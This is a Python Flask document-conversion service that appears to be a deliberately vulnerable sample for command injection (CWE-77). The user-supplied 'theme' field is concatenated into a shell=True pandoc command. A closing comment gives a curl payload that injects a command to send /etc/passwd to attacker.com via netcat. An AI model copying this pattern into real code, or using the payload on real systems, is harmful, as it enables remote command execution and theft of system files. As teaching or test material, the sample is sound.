import os
import sqlite3
import uuid
import logging
import subprocess
from flask import Flask, request, jsonify, send_file
from werkzeug.utils import secure_filename
from datetime import datetime

# Configure logging for the Document Conversion Microservice
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - DocConverterAPI - %(levelname)s - %(message)s'
)
logger = logging.getLogger("DocConverter")

DB_FILE = "conversion_jobs.db"
UPLOAD_FOLDER = "/tmp/doc_uploads"
OUTPUT_FOLDER = "/tmp/doc_outputs"

app = Flask(__name__)
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024  # 16 MB max

def setup_database():
    """Initializes the SQLite database to track document conversion jobs."""
    os.makedirs(UPLOAD_FOLDER, exist_ok=True)
    os.makedirs(OUTPUT_FOLDER, exist_ok=True)
    
    if os.path.exists(DB_FILE):
        return

    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE jobs (
            job_id TEXT PRIMARY KEY,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
            original_filename TEXT NOT NULL,
            target_format TEXT NOT NULL,
            custom_theme TEXT,
            status TEXT NOT NULL
        )
    ''')
    conn.commit()
    conn.close()
    logger.info("Conversion job tracking database initialized.")

def record_job(job_id: str, filename: str, target_format: str, theme: str, status: str):
    """Logs the conversion job details into the database."""
    try:
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        cursor.execute(
            "INSERT INTO jobs (job_id, original_filename, target_format, custom_theme, status) VALUES (?, ?, ?, ?, ?)",
            (job_id, filename, target_format, theme, status)
        )
        conn.commit()
        conn.close()
    except sqlite3.Error as e:
        logger.error(f"Failed to record job {job_id} to DB: {e}")

def convert_document_with_theme(input_path: str, output_path: str, format_type: str, theme_flag: str):
    """
    VULNERABLE FUNCTION: CWE-77 Command Injection
    Trigger Path: Flask HTTP POST Form Data ('theme' parameter)
    """
    logger.info(f"Starting conversion of {input_path} to {format_type} with theme: {theme_flag}")
    
    # Vulnerability: Direct string concatenation of the HTTP Form Data value into a shell command.
    # The 'theme_flag' variable is supplied by the user and inserted directly into the command string.
    # We use pandoc as the hypothetical underlying tool.
    command = f"pandoc '{input_path}' -o '{output_path}' --highlight-style={theme_flag}"
    
    try:
        logger.debug(f"Executing document conversion command: {command}")
        
        # shell=True enables the execution of shell metacharacters (;, &&, |, etc.)
        # An attacker can inject commands through the 'theme_flag' parameter.
        process = subprocess.run(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            timeout=30
        )
        
        if process.returncode == 0:
            logger.info("Document conversion completed successfully.")
            return True, process.stdout
        else:
            logger.error(f"Pandoc conversion failed: {process.stderr}")
            return False, process.stderr
            
    except subprocess.TimeoutExpired:
        logger.error("Document conversion timed out after 30 seconds.")
        return False, "Conversion process timed out."
    except Exception as e:
        logger.error(f"System error during conversion: {e}")
        return False, str(e)

@app.route('/api/v2/convert', methods=['POST'])
def handle_conversion_request():
    """Flask route to handle multipart/form-data document uploads and conversion."""
    if 'document' not in request.files:
        return jsonify({"error": "Missing 'document' file in form data"}), 400
        
    file = request.files['document']
    if file.filename == '':
        return jsonify({"error": "No selected file"}), 400
        
    # Extract untrusted data from the form
    target_format = request.form.get('format', 'pdf')
    # If theme is not provided, defaults to 'tango'
    theme_input = request.form.get('theme', 'tango')
    
    job_id = str(uuid.uuid4())
    safe_filename = secure_filename(file.filename)
    input_filepath = os.path.join(app.config['UPLOAD_FOLDER'], f"{job_id}_{safe_filename}")
    output_filepath = os.path.join(OUTPUT_FOLDER, f"{job_id}.{target_format}")
    
    try:
        # Save the uploaded file securely to disk
        file.save(input_filepath)
        
        # Pass the untrusted theme input to the vulnerable conversion function
        success, message = convert_document_with_theme(
            input_filepath, 
            output_filepath, 
            target_format, 
            theme_input
        )
        
        if success:
            record_job(job_id, safe_filename, target_format, theme_input, "SUCCESS")
            return jsonify({
                "status": "success",
                "job_id": job_id,
                "message": "Conversion successful",
                "download_path": f"/api/v2/download/{job_id}.{target_format}"
            }), 200
        else:
            record_job(job_id, safe_filename, target_format, theme_input, "FAILED")
            return jsonify({
                "error": "Conversion failed",
                "details": message  # Potentially leaks command output to the attacker
            }), 500
            
    finally:
        # Cleanup the original uploaded file
        if os.path.exists(input_filepath):
            os.remove(input_filepath)

if __name__ == '__main__':
    setup_database()
    logger.info("Starting Document Conversion API on http://0.0.0.0:5000")
    
    # Example Malicious Request exploiting the Form Data:
    # curl -X POST http://127.0.0.1:5000/api/v2/convert \
    #      -F "document=@report.md" \
    #      -F "format=pdf" \
    #      -F "theme=tango; cat /etc/passwd | nc attacker.com 9999; #"
    
    app.run(host='0.0.0.0', port=5000, debug=False)
